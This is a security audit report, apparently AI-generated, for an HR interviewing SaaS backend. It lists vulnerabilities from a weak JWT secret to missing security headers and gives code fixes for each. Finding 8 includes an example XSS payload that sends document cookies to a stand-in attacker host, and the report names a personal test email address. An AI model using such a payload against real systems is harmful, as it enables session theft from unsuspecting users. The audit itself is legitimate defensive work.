# HR AI Interviewer SaaS — Security & Performance Audit
**Date:** April 20, 2026

---

## CRITICAL (Fix Before Any Demo/Production)

### 1. Weak JWT Secret — Full Account Takeover
- **File:** `backend/app/config.py:14`, `.env`
- **Issue:** JWT secret is `hr-interviewer-dev-secret-key-2026` — short and guessable. HS256 with a weak secret is brute-forceable with tools like `jwt-cracker` in minutes.
- **Exploit:** Attacker brute-forces the secret, then forges a token for any `user_id` + `company_id` → full admin access to all jobs, all candidates, all data.
- **Fix:** Generate a random 64-byte key and replace in `.env`:
  ```bash
  python -c "import secrets; print(secrets.token_hex(64))"
  ```
  Add a startup check that blocks the server if the default placeholder is still set.

### 2. API Keys in `.env`
- **File:** `.env` lines 11-12
- **Issue:** Real DeepSeek (`sk-5d134a...`), Anthropic (`sk-ant-api03-...`), and Resend (`re_3DMfa...`) API keys are in the `.env` file.
- **Risk:** If this file was ever committed to git, keys are exposed in git history.
- **Fix:**
  1. Run `git log --all -p -- .env` to check git history.
  2. Rotate all 3 keys (DeepSeek, Anthropic, Resend).
  3. Use a secrets manager or CI-injected environment variables in production.

### 3. Hardcoded Test Email Bypass
- **File:** `backend/app/services/interview_service.py:107-119`
- **Issue:** `_TEST_EMAILS = {"ferrer.jedidiah@gmail.com"}` bypasses duplicate-application restriction, allowing unlimited re-applications and deletion of previous applications.
- **Exploit:** Anyone who discovers this email can bypass application guards at will.
- **Fix:** Gate behind an env flag that defaults to off:
  ```python
  import os
  _TEST_EMAILS = set(os.getenv("TEST_EMAILS", "").split(",")) if os.getenv("ENABLE_TEST_EMAILS") else set()
  ```

---

## HIGH — How an Attacker Could Bring Down the Site

### 4. LLM Cost Bomb: No `num_questions` Cap
- **File:** `backend/app/schemas/job.py:21`
- **Attack:** Malicious HR user creates a job with `"interview_config": {"num_questions": 500}`. Every candidate interview triggers 500+ LLM calls. At ~$0.01–0.05/call, one interview costs $5–25. 10 fake candidates = $50–250.
- **Fix:** Replace `interview_config: dict | None = None` with a typed Pydantic model:
  ```python
  class InterviewConfig(BaseModel):
      num_questions: int = Field(default=8, ge=1, le=20)
  ```

### 5. LLM Cost Bomb: No Per-Interview Message Cap
- **File:** `backend/app/services/interview_service.py:434`
- **Attack:** Rate limit is 60 messages/min per IP. With proxies, a candidate can sustain high throughput indefinitely as long as interview status stays `in_progress`. Each message triggers 1–2 LLM calls.
- **Fix:** Add a hard cap in `process_message()`:
  ```python
  if len(transcript) > 50:
      raise HTTPException(429, "Interview message limit reached")
  ```

### 6. No Rate Limit on Signup — Database Pollution
- **File:** `backend/app/middleware/rate_limiter.py:13-14`
- **Issue:** `RATE_LIMITS` covers `/auth/login` and interview endpoints but NOT `/auth/signup`. Unlimited signup requests possible.
- **Attack:** Script creates thousands of fake companies/users, bloating the DB.
- **Fix:** Add to `RATE_LIMITS`:
  ```python
  "/auth/signup": (5, 60),  # 5 requests per 60 seconds per IP
  ```

### 7. No Token Revocation — 7-Day Window
- **File:** `backend/app/utils/security.py:39-53`, `backend/app/config.py:16`
- **Issue:** JWT expires in 7 days. No refresh tokens, no revocation. Changing password does NOT invalidate existing tokens.
- **Exploit:** Stolen JWT grants 7 days of full access with no way to revoke it.
- **Fix (MVP):** Reduce expiry to 1 hour. Add refresh token endpoint. Add `password_changed_at` claim and verify it in `get_current_user`.

### 8. HTML Injection in Emails
- **File:** `backend/app/services/email_service.py:31-43`
- **Issue:** `candidate_name`, `job_title`, `company_name` are interpolated directly into HTML with no escaping.
- **Attack:** Candidate applies with name `<img src=x onerror=fetch('https://evil.com/steal?c='+document.cookie)>`. When HR user opens the email, the payload executes.
- **Fix:**
  ```python
  import html
  candidate_name = html.escape(candidate_name)
  job_title = html.escape(job_title)
  company_name = html.escape(company_name)
  ```

---

## MEDIUM — Hardening for Production

### 9. In-Memory Rate Limiter Doesn't Scale
- **File:** `backend/app/middleware/rate_limiter.py:25-30`
- **Issue:** Rate limits are per-process. With multiple uvicorn workers, effective limits are multiplied by worker count. Memory also leaks slowly (IP keys never pruned).
- **MVP OK?** Yes.
- **Production fix:** Replace with Redis-based rate limiter (`slowapi` with Redis backend).

### 10. No Magic Byte Validation on Uploads
- **File:** `backend/app/utils/storage.py:14-20`
- **Issue:** Only checks file extension, not actual file content. A file named `evil.pdf` could contain anything.
- **Fix:** Validate first bytes of uploaded file:
  ```python
  header = await file.read(4)
  await file.seek(0)
  if ext == ".pdf" and not header.startswith(b"%PDF"):
      raise HTTPException(400, "Invalid PDF file")
  if ext == ".docx" and not header.startswith(b"PK\x03\x04"):
      raise HTTPException(400, "Invalid DOCX file")
  ```

### 11. CORS Wildcard Methods + Headers
- **File:** `backend/app/main.py:48-54`
- **Issue:** `allow_methods=["*"]`, `allow_headers=["*"]` with `allow_credentials=True`. Origins are localhost for dev, but if `"*"` ever gets added to origins, this becomes a credential-leaking misconfiguration.
- **Fix (production):** Explicitly list:
  ```python
  allow_methods=["GET", "POST", "PUT", "DELETE", "OPTIONS"],
  allow_headers=["Authorization", "Content-Type"],
  allow_origins=os.getenv("CORS_ORIGINS", "https://yourdomain.com").split(","),
  ```

### 12. No Password Complexity Rules
- **File:** `backend/app/schemas/auth.py:12`
- **Issue:** `min_length=8` is the only check. `"aaaaaaaa"` is a valid password.
- **Fix:** Add validator:
  ```python
  @field_validator("password")
  @classmethod
  def password_complexity(cls, v: str) -> str:
      if not any(c.isdigit() for c in v):
          raise ValueError("Password must contain at least one digit")
      if not any(c.isalpha() for c in v):
          raise ValueError("Password must contain at least one letter")
      return v
  ```

### 13. Fire-and-Forget Background Tasks (Reliability)
- **File:** `backend/app/services/interview_service.py:585`
- **Issue:** `asyncio.get_event_loop().create_task()` is deprecated. If the server restarts mid-evaluation, the task is lost with no retry.
- **MVP fix:** Change to `asyncio.create_task()`.
- **Production fix:** Use a task queue (Celery + Redis, or ARQ).

### 14. No Security Headers
- **Missing:** No `X-Content-Type-Options`, `X-Frame-Options`, `Strict-Transport-Security`, `Content-Security-Policy`.
- **Fix:** Add middleware to `main.py`:
  ```python
  @app.middleware("http")
  async def security_headers(request: Request, call_next):
      response = await call_next(request)
      response.headers["X-Content-Type-Options"] = "nosniff"
      response.headers["X-Frame-Options"] = "DENY"
      response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
      response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
      return response
  ```

---

## LOW

| # | Issue | Location | Fix |
|---|-------|----------|-----|
| 15 | `job.status` accepts any string | `schemas/job.py:33` | Use `Literal["active", "paused", "archived"]` |
| 16 | N+1 queries in job listing | `job_service.py:63-88` | 2 extra queries per job; use subquery aggregations |
| 17 | `candidate_id` in public response | `schemas/interview.py:17` | Remove internal UUID from public apply response |
| 18 | No audit logging | Everywhere | Log access to sensitive endpoints with user + timestamp |
| 19 | No account lockout | `rate_limiter.py` | Rate limit is IP-based only, not account-based |

---

## What's Already Good

- **No SQL injection** — all queries use SQLAlchemy ORM
- **Tenant isolation** enforced via `company_id` in all service functions
- **Interview tokens** use `secrets.token_urlsafe(24)` (192 bits) — not guessable
- **Job link tokens** also use `secrets.token_urlsafe(24)` — strong
- **bcrypt** used for password hashing
- **Resume download** has path traversal guard (`startswith(uploads_root)` check)
- **File size limits** enforced (10MB)
- **JWT expiry** enforced with proper `ExpiredSignatureError` handling

---

## Implementation Priority

### Do Now (Before Any Real Users)
1. [x] Rotate JWT secret to random 64-byte key
2. [x] Check git history for `.env`, rotate all API keys if needed (no git repo found — not committed)
3. [x] Cap `num_questions` (Pydantic validation, max 20)
4. [x] Add per-interview message cap (50 messages)
5. [x] Add signup rate limit (5/min per IP)
6. [x] Escape HTML in email service

### Before Production Deployment
7. [ ] Reduce JWT expiry + implement refresh tokens
8. [ ] Remove/gate test email bypass behind env var
9. [ ] Add security headers middleware
10. [ ] Add magic byte validation on file uploads
11. [ ] Password complexity rules
12. [ ] Switch to Redis rate limiter (multi-worker support)
13. [ ] N+1 fix in job listing (subquery aggregation)
14. [ ] CORS: explicit methods/headers, env-var origins list

---

*Generated by GitHub Copilot security audit — April 20, 2026*
